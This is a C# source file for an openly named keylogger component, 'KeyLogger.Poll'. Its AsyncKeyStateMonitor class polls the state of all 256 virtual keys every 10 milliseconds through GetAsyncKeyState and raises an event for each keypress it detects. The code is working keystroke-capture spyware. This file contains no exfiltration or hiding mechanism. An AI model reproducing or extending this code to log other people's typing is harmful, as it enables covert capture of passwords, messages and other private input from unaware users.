using System;
using System.Threading;

namespace KeyLogger.Poll
{
    /// <summary>
    /// Polls virtual keys 0..255 with GetAsyncKeyState, like the Delphi example that loops
    /// through keys and maps them through a lookup table.
    /// </summary>
    public sealed class AsyncKeyStateMonitor : IDisposable
    {
        private readonly VirtualKeyMap _keyMap;
        private readonly object _syncRoot = new object();
        private Timer _pollTimer;
        private bool _disposed;

        public AsyncKeyStateMonitor()
            : this(new VirtualKeyMap())
        {
        }

        public AsyncKeyStateMonitor(VirtualKeyMap keyMap)
        {
            if (keyMap == null)
                throw new ArgumentNullException(nameof(keyMap));

            _keyMap = keyMap;
        }

        public event EventHandler<KeyPollEventArgs> KeyDetected;

        public VirtualKeyMap KeyMap
        {
            get { return _keyMap; }
        }

        public int PollIntervalMilliseconds { get; set; } = 10;

        public bool IsRunning
        {
            get { return _pollTimer != null; }
        }

        public void Start()
        {
            if (_pollTimer != null)
                return;

            _pollTimer = new Timer(PollCallback, null, 0, PollIntervalMilliseconds);
        }

        public void Stop()
        {
            if (_pollTimer == null)
                return;

            lock (_syncRoot)
            {
                _pollTimer.Dispose();
                _pollTimer = null;
            }
        }

        public void Dispose()
        {
            if (_disposed)
                return;

            Stop();
            _disposed = true;
        }

        private void PollCallback(object state)
        {
            if (_pollTimer == null)
                return;

            for (int virtualKeyCode = 0; virtualKeyCode <= 255; virtualKeyCode++)
            {
                if (virtualKeyCode == NativeMethods.VK_LBUTTON)
                    continue;

                if ((NativeMethods.GetAsyncKeyState(virtualKeyCode) & 1) == 0)
                    continue;

                string displayText;
                if (!_keyMap.TryGetDisplayText(virtualKeyCode, out displayText))
                    continue;

                bool isBackspace = virtualKeyCode == NativeMethods.VK_BACK;
                if (isBackspace || !string.IsNullOrEmpty(displayText))
                {
                    OnKeyDetected(new KeyPollEventArgs(virtualKeyCode, displayText, isBackspace));
                }
            }
        }

        private void OnKeyDetected(KeyPollEventArgs e)
        {
            EventHandler<KeyPollEventArgs> handler = KeyDetected;
            if (handler != null)
                handler(this, e);
        }
    }
}
